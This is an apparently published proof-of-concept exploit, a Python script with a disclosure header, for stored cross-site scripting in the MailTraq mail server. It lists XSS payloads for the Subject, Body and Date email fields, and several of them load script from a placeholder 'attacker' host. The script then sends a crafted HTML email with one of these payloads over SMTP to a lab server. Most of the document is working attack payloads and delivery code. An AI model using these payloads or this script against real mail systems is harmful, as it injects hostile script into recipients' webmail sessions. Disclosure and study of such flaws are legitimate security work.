#!/usr/bin/python

'''

Author: loneferret of Offensive Security
Product: MailTraq
Version: 2.17.3.3150(Mar 5th, 2012)
Vendor Site: http://www.mailtraq.com/
Software Download: http://www.mailtraq.com/30day

Timeline:
29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
23 Jul 2012: Update from CERT: No response from vendor
08 Aug 2012: Public Disclosure

Installed On: Windows Server 2003 SP2
Client Test OS: Window 7 Pro SP1 (x86)
Browser Used: Internet Explorer 9

Injection Point: Subject
Injection Payload(s):
1: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
2: <!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]--
3: </TITLE><SCRIPT>alert("XSS");</SCRIPT>

Injection Point: Body
Injection Payload(s):
1: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
2: <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
3: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">

Injection Point: Date
Injection Payload(s):
1: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
2: <SCRIPT>alert('XSS')</SCRIPT>
3: <SCRIPT SRC=http://attacker/xss.js></SCRIPT>
4: <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
5: <DIV STYLE="width: expression(alert('XSS'));">
6: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
7: <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
8: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
9: <XSS STYLE="xss:expression(alert('XSS'))">
10: <!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]--
11: <SCRIPT SRC="http://attacker/xss.jpg"></SCRIPT>
12: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
13: <SCRIPT/XSS SRC="http://attacker/xss.js"></SCRIPT>
14: <SCRIPT SRC=//attacker/.j>
15: <<SCRIPT>alert("XSS");//<</SCRIPT>
16: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
17: <SCRIPT a=">" SRC="http://attacker/xss.js"></SCRIPT>
18: <SCRIPT ="blah" SRC="http://attacker/xss.js"></SCRIPT>
19: <SCRIPT a="blah" '' SRC="http://attacker/xss.js"></SCRIPT>
20: <SCRIPT "a='>'" SRC="http://attacker/xss.js"></SCRIPT>
21: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://attacker/xss.js"></SCRIPT>
22: <SCRIPT a=">'>" SRC="http://attacker/xss.js"></SCRIPT>

'''

import smtplib, urllib2

payload = """</TITLE><SCRIPT>alert("XSS");</SCRIPT>"""

def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@victim.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: XSS" + payload + "\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS.\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()

username = "hacker@offsec.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.84.171"

print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)